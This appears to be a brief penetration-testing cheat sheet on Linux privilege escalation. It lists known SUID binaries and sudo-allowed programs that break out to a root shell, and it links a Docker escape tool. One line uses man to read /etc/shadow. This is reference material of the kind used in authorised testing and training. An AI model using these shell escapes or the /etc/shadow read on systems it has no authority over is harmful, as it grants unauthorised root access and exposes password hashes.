### [See Linux Enumeration](../../Enumeration/FromTarget/Linux/README.md)

### SUID Binaries
##### Known SUID Binaries
```bash
/bin/ping
/bin/su
/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
```

### SUDO
##### Common Sudo Binaries to Establish root Shells
```bash
less (!sh)
more (!sh)
VIM/VIM (:!sh)
nmap (--interactive + !sh)
ftp (!sh)
gdb (!sh)
python
Perl
lrb
lua
```
##### Common Sudo Binaries to Execute Commands
```bash
man -P "id" man
man -P "cat /etc/shadow" man
```
##### Docker
[dockerevil](https://github.com/pyperanger/dockerevil)